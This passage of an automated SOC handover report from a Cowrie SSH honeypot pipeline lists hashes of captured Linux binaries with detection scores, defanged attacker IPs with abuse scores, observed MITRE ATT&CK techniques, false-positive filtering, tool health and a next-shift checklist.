| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `131.0.226[.]61` | BR | Defensoria Pública de Pernambuco | **100** ⚠️ | 20 |
| `119.160.215[.]50` | PK | ULTRA LINK (PRIVATE) LIMITED | **100** ⚠️ | 15 |
| `14.103.121[.]78` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `34.67.115[.]220` | US | Google LLC | **100** ⚠️ | 15 |
| `183.56.235[.]140` | CN | CHINANET Guangdong province network | **100** ⚠️ | 17 |
| `1.214.179[.]202` | KR | LG Uplus | **100** ⚠️ | 26 |
| `14.103.127[.]232` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `36.138.202[.]60` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `76.11.71[.]59` | CA | Eastlink HSI | **100** ⚠️ | 8 |
| `14.103.105[.]254` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 72 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 37 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 127 cases |
| Tool 34  | Credential Extractor        | ✅ 65 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (2.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 15 recon entry/entries in table (3 group(s) consolidating 84 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-16T09:25:13Z_
